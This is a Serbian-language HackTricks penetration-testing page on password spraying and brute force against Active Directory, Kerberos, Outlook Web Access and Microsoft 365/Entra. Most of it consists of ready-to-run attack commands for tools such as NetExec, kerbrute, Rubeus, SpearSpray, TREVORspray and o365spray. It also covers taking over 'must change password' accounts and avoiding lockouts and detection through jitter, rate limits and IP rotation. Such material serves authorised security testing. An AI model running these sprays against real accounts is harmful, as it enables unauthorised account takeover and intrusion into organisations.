# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Kada pronađete nekoliko **valid usernames**, možete isprobati najčešće **passwords** (imajući u vidu password policy okruženja) sa svakim od pronađenih korisnika.\
**Podrazumevano**, **minimalna** **dužina** **passworda** je **7**.

Liste uobičajenih usernames takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Imajte na umu da možete **zaključati neke naloge ako isprobate nekoliko pogrešnih passworda** (podrazumevano više od 10).

### Dobavljanje password policy-ja

Ako imate credentials nekog korisnika ili shell kao domain user, možete **dobaviti password policy pomoću**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploatacija iz Linuxa (ili sve)

- Korišćenjem **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Korišćenje **NetExec (CME successor)** za ciljano password spraying testiranje sa malo šuma preko SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Korišćenjem [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(možete navesti broj pokušaja kako biste izbegli zaključavanje naloga):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Korišćenjem [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIJE PREPORUČLJIVO, PONEKAD NE RADI<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Pomoću modula `scanner/smb/smb_login` u alatu **Metasploit**:

![Password Spraying - Brute-Force: Pomoću modula scanner/smb/smb login u alatu Metasploit](<../../images/image (745).png>)

- Korišćenjem alata **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Iz Windows-a

- Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom koja sadrži brute modul:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Pomoću [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Podrazumevano može da generiše korisnike iz domena i preuzeće password policy sa domena i ograničiti broj pokušaja u skladu sa njom):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Pomoću [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifikujte i preuzmite naloge „Lozinka mora da se promeni pri sledećoj prijavi“ (SAMR)

Tehnika sa malo šuma je pokušaj prijave sa bezazlenom/praznom lozinkom i pronalaženje naloga koji vraćaju STATUS_PASSWORD_MUST_CHANGE, što ukazuje da je lozinka prisilno istekla i da može da se promeni bez poznavanja stare lozinke.<sup>[[9]](#references)[[10]](#references)</sup>

Tok rada:
- Nabrojte korisnike (RID brute putem SAMR-a) da biste napravili ciljnu listu:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Pošaljite prazan password i nastavite nakon pogodaka da biste obuhvatili naloge koji moraju da promene password pri sledećem prijavljivanju:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Za svaki uspešan pogodak promenite lozinku preko SAMR koristeći NetExec-ov modul (stara lozinka nije potrebna kada je postavljeno „must change“):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operativne napomene:
- Uverite se da je sat na vašem hostu sinhronizovan sa DC-om pre Kerberos-based operacija: `sudo ntpdate <dc_fqdn>`.
- [+] bez (Pwn3d!) u nekim modulima (npr. RDP/WinRM) znači da su kredencijali validni, ali nalogu nedostaju prava za interaktivnu prijavu.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying sa LDAP targetiranjem i PSO-aware throttlingom (SpearSpray)

Spraying zasnovan na Kerberos pre-auth mehanizmu smanjuje šum u odnosu na SMB/NTLM/LDAP bind pokušaje i bolje se usklađuje sa AD lockout politikama. SpearSpray kombinuje LDAP-driven targetiranje, pattern engine i policy awareness (domain policy + PSO + badPwdCount buffer) kako bi spraying bio precizan i bezbedan. Takođe može da označi kompromitovane principals u Neo4j-u radi BloodHound pathing-a.<sup>[[1]](#references)</sup>

Ključne ideje:
- LDAP user discovery sa paging-om i podrškom za LDAPS, uz opciono korišćenje prilagođenih LDAP filtera.
- Domain lockout policy + PSO-aware filtering za ostavljanje podesivog attempt buffer-a (threshold) i sprečavanje zaključavanja korisnika.
- Kerberos pre-auth validation pomoću brzih gssapi bindings-a (generiše 4768/4771 na DC-ovima umesto 4625).
- Pattern-based generisanje password-a po korisniku, uz korišćenje varijabli kao što su imena i temporal values izvedenih iz pwdLastSet vrednosti svakog korisnika.
- Kontrola throughput-a pomoću thread-ova, jitter-a i maksimalnog broja zahteva u sekundi.
- Opcionа Neo4j integracija za označavanje owned users radi BloodHound-a.

Osnovna upotreba i discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciljanje i kontrola obrazaca:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Kontrole prikrivenosti i bezbednosti:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound obogaćivanje:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pregled sistema obrazaca (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Dostupne promenljive uključuju:
- {name}, {samaccountname}
- Vremenske vrednosti iz pwdLastSet (ili whenCreated) svakog korisnika: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Pomoćne promenljive za kompoziciju i token organizacije: {separator}, {suffix}, {extra}

Operativne napomene:

- Prednost dajte upitima prema PDC-emulatoru koristeći -dc kako biste pročitali najmerodavnije vrednosti badPwdCount i informacije povezane sa pravilima.
- Resetovanje vrednosti badPwdCount pokreće se pri sledećem pokušaju nakon isteka perioda posmatranja; koristite prag i vremensko raspoređivanje kako biste ostali bezbedni.
- Kerberos pokušaji sa pre-auth prikazuju se kao 4768/4771 u telemetriji DC-a; koristite jitter i ograničavanje brzine kako biste se uklopili u uobičajeni saobraćaj.

> Savet: Podrazumevana veličina LDAP stranice u alatu SpearSpray je 200; po potrebi je podesite pomoću -lps.

## Outlook Web Access

Postoji više alata za **password spraying outlook**.

- Pomoću [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- pomoću [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Pomoću [Ruler](https://github.com/sensepost/ruler) (pouzdan!)<sup>[[5]](#references)</sup>
- Pomoću [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (PowerShell)
- Pomoću [MailSniper](https://github.com/dafthack/MailSniper) (PowerShell)

Da biste koristili neki od ovih alata, potrebni su vam spisak korisnika i jedna lozinka / mali spisak lozinki za spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Za cloud spraying, najpre utvrdite da li je tenant **managed**, **federated** ili **hybrid**, jer se endpoint i ponašanje zaključavanja mogu razlikovati od on-prem AD-a. U Microsoft Entra, **Smart Lockout** menja način na koji ponovljeni pokušaji troše budžet zaključavanja:<sup>[[7]](#references)</sup>

- Ponavljanje **iste pogrešne lozinke** ne povećava brojač zaključavanja, ali pokušavanje **novih kandidata** povećava.
- **Familiar** i **unfamiliar** lokacije imaju odvojene brojače.
- Tenant-i koji koriste **pass-through authentication (PTA)** nemaju korist od praćenja hash-a pogrešne lozinke, pa ih tretirajte više kao klasične ciljeve osetljive na zaključavanje.

U praksi, radite spray sa **jednom lozinkom po rundi**, ostavite dovoljno vremena između rundi i preferirajte alate koji mogu da otkriju stvarni auth flow tenant-a pre slanja pokušaja.

- Uz [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), možete izvršiti recon tenant-a, otkriti `token_endpoint`, raditi spray protiv `msol`/`adfs`/`owa`/`okta` i usmeravati saobraćaj kroz više izlaznih IP adresa:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Pomoću alata [**Spray365**](https://github.com/MarkoH17/Spray365) možete unapred napraviti plan izvršavanja koji se može nastaviti, nasumično rasporediti redosled autentikacije i nametnuti **minimalno kašnjenje po korisniku** kako biste ostali izvan perioda zaključavanja:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Pomoću [**o365spray**](https://github.com/0xZDH/o365spray) možete validirati tenant, enumerisati korisnike pomoću modula kao što je `onedrive` i vršiti spray preko `oauth2` ili `adfs`, uz održavanje **jednog pokušaja po korisniku** tokom perioda zaključavanja. Ako već imate FireProx API, prosledite ga pomoću `--proxy-url` da biste distribuirali izvorne IP adrese:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Nedavna operatorska praksa takođe se pomerila ka **distribuiranom cloud spraying-u**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) podržava vremenske prozore, nasumično menjanje redosleda lozinki, ADFS/M365 spraying i automatsku eksfiltraciju nakon autentifikacije. Nedavna zloupotreba u stvarnom svetu takođe je koristila **Microsoft Teams API** za enumeraciju naloga i **AWS region rotation** za raspoređivanje talasa spraying-a preko više geografskih lokacija izvora.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Reference

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
